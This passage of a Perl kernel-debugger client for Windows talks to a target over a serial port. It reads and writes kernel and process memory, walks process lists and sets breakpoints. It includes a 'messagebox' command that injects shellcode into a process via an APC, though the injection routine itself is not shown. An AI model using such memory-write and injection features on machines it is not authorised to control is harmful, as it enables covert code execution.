#!/usr/bin/perl
# win debug client
#
# Copyright (C) 2007 SecureWorks, Inc.
#
# This program is free software subject to the terms of the GNU General 
# Public License.  You can use, copy, redistribute and/or modify the 
# program under the terms of the GNU General Public License as published 
# by the Free Software Foundation; either version 3 of the License, or 
# (at your option) any later version. You should have received a copy of 
# the GNU General Public License along with this program.  If not, 
# please see http://www.gnu.org/licenses/ for a copy of the GNU General 
# Public License.
#
# The program is subject to a disclaimer of warranty and a limitation of 
# liability, as disclosed below.
#
# Disclaimer of Warranty.
#
# THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
# APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
# HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT 
# WARRANTY OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT 
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A 
# PARTICULAR PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE 
# OF THE PROGRAM IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU 
# ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR, CORRECTION OR 
# RECOVERY FROM DATA LOSS OR DATA ERRORS.
#
# Limitation of Liability.
#
# IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
# WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR 
# CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, 
# INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES 
# ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT 
# NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES 
# SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE 
# WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN 
# ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.

use Device::SerialPort;
use IO::Select;
use strict;

$| = 1;
my $dev = $ARGV[0];
$dev ||= "/dev/ttyS0";
$SIG{'ALRM'} = sub { die "timeout" };
my $timeout = 10;    # max time to wait on packet
my $running = 1;

my $pcontext;        # global process context
my %kernelcontext;
$kernelcontext{'peb'}      = 0;
$kernelcontext{'pid'}      = 0;
$kernelcontext{'eprocess'} = 0;
$kernelcontext{'dtb'}      = 0;
my %processcontext;
$processcontext{'peb'}      = 0;
$processcontext{'pid'}      = 0;
$processcontext{'eprocess'} = 0;
$processcontext{'dtb'}      = 0;
$pcontext                   = \%kernelcontext;

my $version;
my $kernelbase;
my %exceptions = (
    3221225477 => "EXCEPTION_ACCESS_VIOLATION",
    3221225612 => "EXCEPTION_ARRAY_BOUNDS_EXCEEDED",
    2147483651 => "EXCEPTION_BREAKPOINT",
    2147483650 => "EXCEPTION_DATATYPE_MISALIGNMENT",
    3221225613 => "EXCEPTION_FLT_DENORMAL_OPERAND",
    3221225614 => "EXCEPTION_FLT_DIVIDE_BY_ZERO",
    3221225615 => "EXCEPTION_FLT_INEXACT_RESULT",
    3221225520 => "EXCEPTION_FLT_INVALID_OPERATION",
    3221225617 => "EXCEPTION_FLT_OVERFLOW",
    3221225522 => "EXCEPTION_FLT_STACK_CHECK",
    3221225523 => "EXCEPTION_FLT_UNDERFLOW",
    2147483649 => "EXCEPTION_GUARD_PAGE",
    3221225501 => "EXCEPTION_ILLEGAL_INSTRUCTION",
    3221225478 => "EXCEPTION_IN_PAGE_ERROR",
    3221225620 => "EXCEPTION_INT_DIVIDE_BY_ZERO",
    3221225525 => "EXCEPTION_INT_OVERFLOW",
    3221225725 => "EXCEPTION_STACK_OVERFLOW"
);

my $nextpid = 1;
my %breakpoints;
my $curbp = 1;
my $controlspace;
my $controlspacesent;
my $ob = tie( *FH, 'Device::SerialPort', "$dev" ) || die "Can't tie: $!\n";
$ob->baudrate(115200);
$ob->parity("none");
$ob->databits(8);
$ob->stopbits(1);
$ob->handshake("none");
$ob->write_settings || die "failed writing settings";
FH->blocking(0);

sub hexformat {
    my $buf = shift;
    my $len = length($buf);
    return unless $len;
    my $b = "0000  ";
    my $c = 0;
    for ( split( //, $buf ) ) {
        $c++;
        $b .= sprintf( "%02x ", ord );
        unless ( $c % 16 ) {
            if ( $c < $len ) {
                $b .= sprintf( "\n%04x ", $c );
            }
            else {
                $b .= sprintf( "\n", $c );
            }
        }
    }
    $b .= "\n" unless substr( $b, -1, 1 ) eq "\n";
    return $b;
}

sub cksum {
    my $sum;
    for ( split( //, shift ) ) {
        $sum += ord;
    }
    return $sum;
}

my $s = IO::Select->new();
$s->add( \*STDIN );
$s->add( \*FH );
my @ready;
sendReset();
while ( @ready = $s->can_read ) {
    for my $fh (@ready) {
        if ( $fh == \*STDIN ) {
            my $line = <$fh>;
            if ( $line =~ /break/ ) {
                print "Sending break...\n";
                $ob->write("b");
            }
            elsif ( $running == 1 ) {
                print "Kernel is busy (send break command)\n";
            }
            elsif ( $line =~ /processcontext ([0-9A-Fa-f]+)/ ) {
                my $pid = hex($1);
                if ( $pid == 0 ) {
                    $pcontext = \%kernelcontext;
                    print "Process context is kernel\n";
                }
                else {
                    my $eproc = getEprocess($pid);
                    my $dtb   = readDword( $eproc + 0x18 );
                    my $peb   = readDword( $eproc + 0x1b0 );

                    if ($peb) {
                        $processcontext{'eprocess'} = $eproc;
                        $processcontext{'dtb'}      = $dtb;
                        $processcontext{'peb'}      = $peb;
                        $processcontext{'pid'}      = $pid;
                        $pcontext                   = \%processcontext;
                        printf "Implicit process is now %x\n", $pid;
                    }
                    else {
                        print "Invalid PID (PEB not found in eprocess)\n";
                    }
                }

            }
            elsif ( $line =~ /getprocaddress (\S+) (\S+)/ ) {
                my $dll    = $1;
                my $export = $2;
                my $addr   = getProcAddress( $dll, $export );
                if ($addr) {
                    printf "%s!%s:%08x\n", $dll, $export, $addr;
                }
                else {
                    printf "%s!%s not found\n", $dll, $export;
                }
            }
            elsif ( $line =~ /listexports ([0-9A-Fa-f]+)/ ) {
                listExports( hex($1) );
            }
            elsif ( $line =~ /^logical2physical ([0-9A-Fa-f]+)/ ) {
                printf "%08x -> %08x\n", hex($1), logical2physical( hex($1) );
            }
            elsif ( $line =~ /^parsepe ([0-9A-Fa-f]+)/ ) {
                my %PE       = parsePE( hex($1) );
                my $compiled = localtime( $PE{"TimeDateStamp"} );
                print "Compiled on $compiled\n";
            }
            elsif ( $line =~
                /^writevirtualmemory ([0-9A-Fa-f]+) [0-9A-Fa-f][0-9A-Fa-f]/ )
            {
                chomp($line);
                my ( $c, $addr, @bytes ) = split( /\s+/, $line );
                sendDbgKdWriteVirtualMemory( hex($addr),
                    join( "", map { chr(hex) } @bytes ) );
            }
            elsif ( $line =~ /^(?:messagebox|mb)\s+(.*)\|(.*)/ ) {
                my $title   = $1;
                my $message = $2;
                injectSUSShellcode( $title, $message );
                insertApc();
            }
            elsif ( $line =~ /^processlist|^listprocess/ ) {
                print "Walking process list...\n";
                my %procs = getProcessList();
                for ( reverse sort keys %procs ) {
                    my $c = localtime( $procs{$_}{'created'} );
                    printf "%04x %s\n", $procs{$_}{'pid'}, $procs{$_}{'name'};
                    printf
                      "Eprocess: %08x  DTB: %08x  PEB: %08x  Created: %s\n", $_,
                      $procs{$_}{'dtb'}, $procs{$_}{'peb'}, $c;
                    print "Threads: ";
                    print join( " ",
                        map { sprintf "%08x", $_ } @{ $procs{$_}{'threads'} } );
                    print "\n\n";
                }
            }
            elsif ( $line =~ /^module|^listmodules/ ) {
                my %modules;
                if ( $pcontext->{'pid'} == 0 ) {
                    %modules = getKernelModules();
                }
                else {
                    %modules = getUserModules();
                }
                for ( sort keys %modules ) {
                    printf "%s\tPath:%s\n", $modules{$_}{'name'},
                      $modules{$_}{'path'};
                    printf "base:%08x  " . "size:%08x entry:%08x\n\n", $_,
                      $modules{$_}{'size'}, $modules{$_}{'entry'};
                }
            }
            elsif ( $line =~ /^findprocessbyname (\S+)/ ) {
                my $name  = $1;
                my %procs = getProcessList();
              PROCFIND:
                for ( sort keys %procs ) {
                    my $c = localtime( $procs{$_}{'created'} );
                    my $n = $procs{$_}{'name'};
                    if ( lc($name) eq lc($n) ) {
                        printf "%04x %s\n", $procs{$_}{'pid'},
                          $procs{$_}{'name'};
                        printf
                          "Eprocess: %08x  DTB: %08x  PEB: %08x  Created: %s\n",
                          $_, $procs{$_}{'dtb'}, $procs{$_}{'peb'}, $c;
                        print "Threads: ";
                        print join( " ",
                            map { sprintf "%08x", $_ }
                              @{ $procs{$_}{'threads'} } );
                        print "\n";
                        last PROCFIND;
                    }
                }
            }
            elsif ( $line =~ /^eprocess ([0-9A-Fa-f]+)/ ) {
                my $ep = getEprocess( hex($1) );
                sendDbgKdReadVirtualMemory( $ep, 648 );
                my $buf = waitPacketQuiet(0x3130);
                if ( length($buf) > 56 ) {
                    my $eproc = substr( $buf, 56 );
                    if ( length($eproc) > 0x20c ) {
                        my $name;
                        if ( $version > 5 ) {
                            $name = substr( $eproc, 0x174, 16 );
                        }
                        else {
                            $name = substr( $eproc, 0x1fc, 16 );
                        }
                        $name =~ s/\x00//g;
                        print "Process name is $name\n";
                        my $next = unpack( "I", substr( $eproc, 0xa0, 4 ) );
                    }

                }
            }
            elsif ( $line =~ /^bp ([0-9A-Fa-f]+)/ ) {
                sendDbgKdWriteBreakPoint($1);
            }
            elsif ( $line =~ /^bc ([0-9A-Fa-f]+)/ ) {
                sendDbgKdRestoreBreakPoint($1);
            }
            elsif ( $line =~ /^bl/ ) {
                print "Breakpoints:\n", join( "\n", sort keys %breakpoints ),
                  "\n";
            }
            elsif ( $line =~ /^continue/ ) {
                sendDbgKdContinue2();
                $running = 1;
            }
            elsif ( $line =~ /^getpspcidtable/ ) {
                getPspCidTable();
            }
            elsif ( $line =~ /^(autocontinue|g)$/ ) {

                # get/set context to update EIP before continuing
                my %context = getContext();
                $context{'EIP'}++;
                setContext(%context);
                sendDbgKdContinue2();
                $running = 1;
            }
            elsif ( $line =~ /^version/ ) {
                printVersionData();
            }
            elsif ( $line =~ /^readcontrolspace/ ) {
                sendDbgKdReadControlSpace();
            }
            elsif ( $line =~ /^writecontrolspace/ ) {
                if ($controlspace) {
                    sendDbgKdWriteControlSpace();
                }
                else {
                    print "Haven't gotten control space yet!\n";
                }
            }
            elsif ( $line =~ /^r (.*)=(.*)/ ) {
                my $reg     = $1;
                my $val     = $2;
                my %context = getContext();
                if ( length($reg) < 4 ) {
                    $reg = uc($reg);
                }
                if ( exists $context{$reg} ) {
                    if ( $reg eq "fp.RegisterArea" ) {
                        printf "Not supported yet.\n";
                    }
                    elsif ( $reg eq "leftovers" ) {
                        printf "Not supported.\n";
                    }
                    else {
                        $context{$reg} = hex($val);
                        setContext(%context);
                        %context = getContext();
                        printf "New value of %s is %08x\n", $reg,
                          $context{$reg};
                    }
                }
                else {
                    print "Register $reg unknown\n";
                }
            }
            elsif ( $line =~ /^r (.*)/ ) {
                my $reg     = $1;
                my %context = getContext();
                if ( length($reg) < 4 ) {
                    $reg = uc($reg);
                }
                if ( exists $context{$reg} ) {
                    if ( $reg eq "fp.RegisterArea" ) {
                        printf "%s = \n%s\n", $reg, hexprint($reg);
                    }
                    else {
                        printf "%s = %08x\n", $reg, $context{$reg};
                    }
                }
                else {
                    print "Register $reg unknown\n";
                }
            }
            elsif ( $line =~ /^r$|^getcontext/ ) {
                my %context = getContext();
                for ( sort keys %context ) {
                    if (   ( $_ ne "fp.RegisterArea" )
                        && ( $_ ne "leftovers" ) )
                    {
                        printf "%s=%08x ", $_, $context{$_};
                    }
                }
                print "\n";
            }
            elsif ( $line =~ /^dw ([0-9A-Fa-f]+)/ ) {
                printf "%08x: %08x\n", hex($1), readDword( hex($1) );
            }
            elsif ( $line =~ /^(?:readvirtualmem|d) ([0-9A-Fa-f]+)/ ) {
                my $vaddr = $1;
                my $readlen;
                if ( $line =~
                    /(?:readvirtualmem|d) ([0-9A-Fa-f]+) ([0-9A-Fa-f]+)/ )
                {
                    $readlen = hex($2);
                }
                $readlen ||= 4;
                my $buf = readVirtualMemory( hex($vaddr), $readlen );
                print hexasc($buf);
            }
            elsif ( $line =~ /^(?:readphysicalmem|dp) ([0-9A-Fa-f]+)/ ) {
                my $addr = $1;
                my $readlen;
                if ( $line =~
                    /(?:readphysicalmem|dp) ([0-9A-Fa-f]+) ([0-9A-Fa-f]+)/ )
                {
                    $readlen = hex($2);
                }
                $readlen ||= 4;
                sendDbgKdReadPhysicalMemory( hex($addr), $readlen );
            }
            elsif ( $line =~ /^reboot/ ) {
                sendDbgKdReboot();
            }
            elsif ( $line =~ /^quit|^exit/ ) {
                untie *FH;
                exit;
            }
            elsif ( $line =~ /^reset/ ) {
                sendReset();
            }
        }
        elsif ( $fh == \*FH ) {
            my $buf = getPacket(1);
            if ($buf) {
                decodePayload($buf);
            }
        }
    }
}

sub getPacket {
    my $payload;
    my $quiet = shift;
    my $buf   = readLoop(4);
    if ( $buf eq "\x30\x30\x30\x30" || $buf eq "\x69\x69\x69\x69" ) {
        my $pl = $buf;
        my $plh = unpack( "I", $buf );
        printf "Got packet leader: %08x\n", $plh unless $quiet;
        $buf = readLoop(2);
        my $ptype = unpack( "S", $buf );
        print "Packet type: $ptype\n" unless $quiet;
        $buf = readLoop(2);
        my $bc = unpack( "S", $buf );
        print "Byte count: $bc\n" unless $quiet;
        $buf = readLoop(4);
        my $pid = unpack( "I", $buf );
        $nextpid = $pid;
        my $pidraw = $buf;
        printf "Packet ID: %08x\n", $pid unless $quiet;
        $buf = readLoop(4);
        my $ck = unpack( "I", $buf );
        printf "Checksum: %08x\n", $ck unless $quiet;

        if ($bc) {
            $payload = readLoop($bc);
        }

        # send ack if it's a non-control packet
        if ( $plh == 0x30303030 ) {

            # packet trailer
            $buf = readLoop(1);
            print hexformat($buf) unless $quiet;
            if ( $buf eq "\xaa" ) {
                print "sending Ack\n" unless $quiet;
                sendAck();
            }
        }
    }
    return $payload;
}

sub decodePayload {
    my $buf   = shift;
    my $quiet = shift;
    if ( substr( $buf, 0, 4 ) eq "\x30\x30\x00\x00" ) {
        my $exception = substr( $buf, 32 );
        decodeException($exception);
        $running = 0;
        my @v = getVersionInfo();
        $version    = $v[0];
        $kernelbase = $v[2];
    }
    elsif ( substr( $buf, 0, 4 ) eq "\x34\x31\x00\x00" ) {
        my $bp = sprintf( "%08x", unpack( "I", substr( $buf, 16, 4 ) ) );
        my $handle = unpack( "I", substr( $buf, 20, 4 ) );
        print "Breakpoint $handle set at $bp\n";
        $breakpoints{$bp} = $handle;
    }
    elsif ( substr( $buf, 0, 4 ) eq "\x35\x31\x00\x00" ) {
        my $handle = unpack( "I", substr( $buf, 16, 4 ) );
        print "Breakpoint $handle cleared\n";
    }
    elsif ( substr( $buf, 0, 4 ) eq "\x46\x31\x00\x00" ) {
        my $version = substr( $buf, 16 );
        print "VERS: ", hexformat($version) unless $quiet;
    }
    elsif ( substr( $buf, 0, 4 ) eq "\x30\x31\x00\x00" ) {
        my $vmem = substr( $buf, 56 );
        print "VMEM:\n", hexasc($vmem) unless $quiet;
    }
    elsif ( substr( $buf, 0, 4 ) eq "\x3d\x31\x00\x00" ) {
        my $pmem = substr( $buf, 56 );
        print "PMEM:\n", hexasc($pmem) unless $quiet;
    }
    elsif ( substr( $buf, 0, 4 ) eq "\x37\x31\x00\x00" ) {
        $controlspace = substr( $buf, 56 );
        print "CNTL: ", hexformat($controlspace) unless $quiet;
    }
    else {
        print "DATA: ", hexasc($buf) unless $quiet;
    }
}

sub packetHeader {
    my $d      = shift;
    my $header = "\x30\x30\x30\x30" .    # packet leader
      "\x02\x00" .    # packet type PACKET_TYPE_KD_STATE_MANIPULATE
      pack( "S", length($d) ) .    # sizeof data
      pack( "I", $nextpid ) .      # packet id
      pack( "I", cksum($d) );      # checksum of data
    return $header;
}

sub readLoop {
    my $wanted = shift;
    my $total  = 0;
    my $count;
    my $outbuf;
    my $buf;
    while ( $total < $wanted ) {
        ( $count, $buf ) = $ob->read(1);
        if ($count) {
            $total += $count;
            $outbuf .= $buf;
        }
    }
    return $outbuf;
}

sub sendAck {
    my $ack =
      "\x69\x69\x69\x69\x04\x00\x00\x00\x00\x00\x80\x80\x00\x00\x00\x00";
    substr( $ack, 8, 4 ) = pack( "I", $nextpid );

    #print hexformat($ack);
    $ob->write($ack);
}

sub sendReset {
    my $rst =
      "\x69\x69\x69\x69\x06\x00\x00\x00\x00\x00\x80\x80\x00\x00\x00\x00";

    #print "Sending reset packet\n";
    #print hexformat($rst);
    $ob->write($rst);
}

sub decodeException {
    my $ex = shift;
    my $code = unpack( "I", substr( $ex, 0, 4 ) );
    if ( $exceptions{$code} ) {
        printf "*** %s ", $exceptions{$code};
    }
    else {
        printf "*** Exception %08 ", $code;
    }
    printf "at %08x\n", unpack( "I", substr( $ex, 16, 4 ) );

    #printf "Exception flags = %08x\n", unpack("I", substr($ex,4,4));
    #printf "Exception record = %08x\n", unpack("I", substr($ex,8,4));
    #printf "Exception address = %08x\n", unpack("I", substr($ex,16,4));
    #printf "Number parameters = %08x\n", unpack("I", substr($ex,24,4));
}

sub getContext {
    my %context;
    sendDbgKdGetContext();
    my $buf = waitPacketQuiet(0x3132);
    if ( length($buf) > 204 ) {
        my $ctx = substr( $buf, 56 );

        #print "CTXT: ", hexformat($context);
        $context{'ContextFlags'}     = unpack( "I", substr( $ctx, 0,  4 ) );
        $context{'DR0'}              = unpack( "I", substr( $ctx, 4,  4 ) );
        $context{'DR1'}              = unpack( "I", substr( $ctx, 8,  4 ) );
        $context{'DR2'}              = unpack( "I", substr( $ctx, 12, 4 ) );
        $context{'DR3'}              = unpack( "I", substr( $ctx, 16, 4 ) );
        $context{'DR6'}              = unpack( "I", substr( $ctx, 20, 4 ) );
        $context{'DR7'}              = unpack( "I", substr( $ctx, 24, 4 ) );
        $context{'fp.ControlWord'}   = unpack( "I", substr( $ctx, 28, 4 ) );
        $context{'fp.StatusWord'}    = unpack( "I", substr( $ctx, 32, 4 ) );
        $context{'fp.TagWord'}       = unpack( "I", substr( $ctx, 36, 4 ) );
        $context{'fp.ErrorOffset'}   = unpack( "I", substr( $ctx, 40, 4 ) );
        $context{'fp.ErrorSelector'} = unpack( "I", substr( $ctx, 44, 4 ) );
        $context{'fp.DataOffset'}    = unpack( "I", substr( $ctx, 48, 4 ) );
        $context{'fp.DataSelector'}  = unpack( "I", substr( $ctx, 52, 4 ) );
        $context{'fp.RegisterArea'} = substr( $ctx, 56, 80 );
        $context{'fp.Cr0NpxState'} = unpack( "I", substr( $ctx, 136, 4 ) );
        $context{'GS'}             = unpack( "I", substr( $ctx, 140, 4 ) );
        $context{'FS'}             = unpack( "I", substr( $ctx, 144, 4 ) );
        $context{'ES'}             = unpack( "I", substr( $ctx, 148, 4 ) );
        $context{'DS'}             = unpack( "I", substr( $ctx, 152, 4 ) );
        $context{'EDI'}            = unpack( "I", substr( $ctx, 156, 4 ) );
        $context{'ESI'}            = unpack( "I", substr( $ctx, 160, 4 ) );
        $context{'EBX'}            = unpack( "I", substr( $ctx, 164, 4 ) );
        $context{'EDX'}            = unpack( "I", substr( $ctx, 168, 4 ) );
        $context{'ECX'}            = unpack( "I", substr( $ctx, 172, 4 ) );
        $context{'EAX'}            = unpack( "I", substr( $ctx, 176, 4 ) );
        $context{'EBP'}            = unpack( "I", substr( $ctx, 180, 4 ) );
        $context{'EIP'}            = unpack( "I", substr( $ctx, 184, 4 ) );
        $context{'CS'}             = unpack( "I", substr( $ctx, 188, 4 ) );
        $context{'Eflags'}         = unpack( "I", substr( $ctx, 192, 4 ) );
        $context{'ESP'}            = unpack( "I", substr( $ctx, 196, 4 ) );
        $context{'SS'}             = unpack( "I", substr( $ctx, 200, 4 ) );
        $context{'leftovers'} = substr( $ctx, 204 );
        return %context;
    }
}

sub setContext {
    my %context = @_;
    my $ctx = pack( "I", $context{'ContextFlags'} );
    $ctx .= pack( "I", $context{'DR0'} );
    $ctx .= pack( "I", $context{'DR1'} );
    $ctx .= pack( "I", $context{'DR2'} );
    $ctx .= pack( "I", $context{'DR3'} );
    $ctx .= pack( "I", $context{'DR6'} );
    $ctx .= pack( "I", $context{'DR7'} );
    $ctx .= pack( "I", $context{'fp.ControlWord'} );
    $ctx .= pack( "I", $context{'fp.StatusWord'} );
    $ctx .= pack( "I", $context{'fp.TagWord'} );
    $ctx .= pack( "I", $context{'fp.ErrorOffset'} );
    $ctx .= pack( "I", $context{'fp.ErrorSelector'} );
    $ctx .= pack( "I", $context{'fp.DataOffset'} );
    $ctx .= pack( "I", $context{'fp.DataSelector'} );
    $ctx .= $context{'fp.RegisterArea'};
    $ctx .= pack( "I", $context{'fp.Cr0NpxState'} );
    $ctx .= pack( "I", $context{'GS'} );
    $ctx .= pack( "I", $context{'FS'} );
    $ctx .= pack( "I", $context{'ES'} );
    $ctx .= pack( "I", $context{'DS'} );
    $ctx .= pack( "I", $context{'EDI'} );
    $ctx .= pack( "I", $context{'ESI'} );
    $ctx .= pack( "I", $context{'EBX'} );
    $ctx .= pack( "I", $context{'EDX'} );
    $ctx .= pack( "I", $context{'ECX'} );
    $ctx .= pack( "I", $context{'EAX'} );
    $ctx .= pack( "I", $context{'EBP'} );
    $ctx .= pack( "I", $context{'EIP'} );
    $ctx .= pack( "I", $context{'CS'} );
    $ctx .= pack( "I", $context{'Eflags'} );
    $ctx .= pack( "I", $context{'ESP'} );
    $ctx .= pack( "I", $context{'SS'} );
    $ctx .= $context{'leftovers'};
    sendDbgKdSetContext($ctx);
    waitPacketQuiet(0x3133);
}

sub getVersionInfo {

    # os version, protocol version, kernel base, module list, debugger data
    sendDbgKdGetVersion();
    my $buf = waitPacketQuiet(0x3146);
    if ( length($buf) > 32 ) {
        my $v = substr( $buf, 16 );
        my $osv = sprintf "%d.%d", unpack( "S", substr( $v, 4, 2 ) ),
          unpack( "S", substr( $v, 6, 2 ) );
        my $pv          = unpack( "S", substr( $v, 8,  2 ) );
        my $machinetype = unpack( "S", substr( $v, 12, 2 ) );
        my $kernbase    = unpack( "I", substr( $v, 16, 4 ) );
        my $modlist     = unpack( "I", substr( $v, 24, 4 ) );
        my $ddata       = unpack( "I", substr( $v, 32, 4 ) );
        if ( $pv < 5 ) {
            printf "Debug protocol version %d not supported\n", $pv;
            exit;
        }
        if ( $machinetype && ( $machinetype != 0x2d ) ) {
            printf "Processor architecture %04x not supported\n", $machinetype;
            exit;
        }

        return ( $osv, $pv, $kernbase, $modlist, $ddata );
    }
    return ( "0.0", 0, 0, 0, 0 );
}

sub printVersionData {
    my @v = getVersionInfo();
    printf "Windows version = %s\n",  $v[0];
    printf "Protocol version = %d\n", $v[1];
    printf "Kernel base = %08x\n",    $v[2];
    printf "Module list = %08x\n",    $v[3];
    printf "Debugger data = %08x\n",  $v[4];
}

sub getKernelModules {
    my $save = $pcontext;
    $pcontext = \%kernelcontext;    # this procedure is kernel context only
    my %modules;
    my @v       = getVersionInfo();
    my $flink   = readDword( $v[3] );
    my @modlist = walkList($flink);
    for my $mod (@modlist) {

        #printf "module at %08x\n", $mod;
        my $buf = readVirtualMemory( $mod, 0x34 );
        if ( length($buf) == 0x34 ) {
            my $base = unpack( "I", substr( $buf, 0x18, 4 ) );
            next if $base == 0;
            my $entry = unpack( "I", substr( $buf, 0x1c, 4 ) );
            my $size = unpack( "I", substr( $buf, 0x20, 4 ) );
            my $path = substr( $buf, 0x24, 8 );
            my $name = substr( $buf, 0x2c, 8 );
            $modules{$base}{'name'}  = unicodeStructToAscii($name);
            $modules{$base}{'path'}  = unicodeStructToAscii($path);
            $modules{$base}{'size'}  = $size;
            $modules{$base}{'entry'} = $entry;
        }
    }
    $pcontext = $save;
    return %modules;
}

sub unicodeStructToAscii {
    my $struct = shift;
    return if length($struct) != 8;
    my $len = unpack( "S", substr( $struct, 0, 2 ) );
    my $vaddr = unpack( "I", substr( $struct, 4, 4 ) );
    my $buf = readVirtualMemory( $vaddr, $len );
    if ( length($buf) == $len ) {
        $buf =~ s/\x00//g;    # ok not really Unicode to Ascii
        return $buf;
    }
}

sub hexasc {
    my $buf = shift;
    my $len = length($buf);
    return unless $len;
    my $count = 0;
    my $ascii;
    my $out = "0000  ";
    for ( split( //, $buf ) ) {
        my $c = ord;
        $out .= sprintf( "%02x ", $c );
        if ( ( $c > 0x1f ) && ( $c < 0x7f ) ) {
            $ascii .= $_;
        }
        else {
            $ascii .= ".";
        }
        unless ( ++$count % 16 ) {
            if ( $count < $len ) {
                $out .= sprintf( " %s\n%04x  ", $ascii, $count );
            }
            else {
                $out .= sprintf( " %s\n", $ascii );
            }
            $ascii = "";
        }
    }
    if ($ascii) {
        my $padding = 48 - ( ( $count % 16 ) * 3 );
        $out .= " " x $padding;
        $out .= " $ascii\n";
    }
    return $out;
}

sub sendManipulateStatePacket {
    my $d = shift;
    my $h = packetHeader($d);

    #print "SEND: ", hexformat($h),
    #		hexformat($d);
    $ob->write($h);
    $ob->write($d);
    $ob->write("\xaa");
}

sub sendDbgKdContinue2 {

    #print "Sending DbgKdContinue2Api packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x313c );
    substr( $d, 8,  4 ) = pack( "I", 0x00010001 );
    substr( $d, 16, 4 ) = pack( "I", 0x00010001 );
    substr( $d, 24, 4 ) = pack( "I", 0x400 );        # TraceFlag
    substr( $d, 28, 4 ) = pack( "I", 0x01 );         # Dr7
    sendManipulateStatePacket($d);
}

sub sendDbgKdGetVersion {

    #print "Sending DbgKdGetVersionApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0, 4 ) = pack( "I", 0x3146 );
    sendManipulateStatePacket($d);
}

sub sendDbgKdWriteBreakPoint {
    my $bp = hex(shift);

    #print "Sending DbgKdWriteBreakPointApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x3134 );
    substr( $d, 16, 4 ) = pack( "I", $bp );
    substr( $d, 20, 4 ) = pack( "I", $curbp++ );
    sendManipulateStatePacket($d);
}

sub sendDbgKdRestoreBreakPoint {
    my $bp = shift;
    if ( defined( $breakpoints{$bp} ) ) {

        #print "Sending DbgKdRestoreBreakPointApi packet\n";
        my $d = "\x00" x 56;
        substr( $d, 0,  4 ) = pack( "I", 0x3135 );
        substr( $d, 16, 4 ) = pack( "I", $breakpoints{$bp} );
        sendManipulateStatePacket($d);
        delete( $breakpoints{$bp} );
    }
    else {
        print "Breakpoint not set at $bp\n";
    }
}

sub DbgKdReadControlSpace {

    #print "Sending DbgKdReadControlSpaceApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x3137 );
    substr( $d, 16, 4 ) = pack( "I", 0x02cc );
    substr( $d, 24, 4 ) = pack( "I", 84 );
    sendManipulateStatePacket($d);
}

sub sendDbgKdWriteControlSpace {

    #print "Sending DbgKdWriteControlSpaceApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x3138 );
    substr( $d, 16, 4 ) = pack( "I", 0x02cc );
    substr( $d, 24, 4 ) = pack( "I", 84 );
    $d .= $controlspace;
    sendManipulateStatePacket($d);
    $controlspacesent = 1;
}

sub sendDbgKdGetContext {

    #print "Sending DbgKdGetContextApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0, 4 ) = pack( "I", 0x3132 );
    sendManipulateStatePacket($d);
}

sub sendDbgKdSetContext {
    my $ctx = shift;

    #print "Sending DbgKdSetContextApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0, 4 ) = pack( "I", 0x3133 );
    substr( $d, 16, 4 ) = substr( $ctx, 0, 4 );
    $d .= $ctx;
    sendManipulateStatePacket($d);
}

sub sendDbgKdReadPhysicalMemory {
    my $addr    = shift;
    my $readlen = shift;

    #print "Sending DbgKdReadPhysicalMemoryApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x313d );
    substr( $d, 16, 4 ) = pack( "I", $addr );
    substr( $d, 24, 4 ) = pack( "I", $readlen );
    sendManipulateStatePacket($d);
}

sub sendDbgKdReadVirtualMemory {
    my $vaddr   = shift;
    my $readlen = shift;

    #print "Sending DbgKdReadVirtualMemoryApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x3130 );
    substr( $d, 16, 4 ) = pack( "I", $vaddr );
    substr( $d, 24, 4 ) = pack( "I", $readlen );
    sendManipulateStatePacket($d);
}

sub sendDbgKdWriteVirtualMemory {
    my $vaddr    = shift;
    my $data     = shift;
    my $writelen = length($data);

    #print "Sending DbgKdWriteVirtualMemoryApi packet\n";
    my $d = "\x00" x 56;
    substr( $d, 0,  4 ) = pack( "I", 0x3131 );
    substr( $d, 16, 4 ) = pack( "I", $vaddr );
    substr( $d, 24, 4 ) = pack( "I", $writelen );
    $d .= $data;
    sendManipulateStatePacket($d);
}

sub readDword {
    my $addr = shift;

    #print "Reading dword at %08x\n", $addr;
    my $buf = readVirtualMemory( $addr, 4 );
    if ( length($buf) == 4 ) {
        return unpack( "I", $buf );
    }
    return "failed";
}

sub readPhysicalMemory {
    my $addr      = shift;
    my $len       = shift;
    my $chunksize = 0x800;    # max to request in one packet
    my $out;
    while ( $len > 0 ) {

        if ( $len < $chunksize ) {
            sendDbgKdReadPhysicalMemory( $addr, $len );
            my $buf = waitPacketQuiet(0x313d);
            if ( length($buf) > 56 ) {
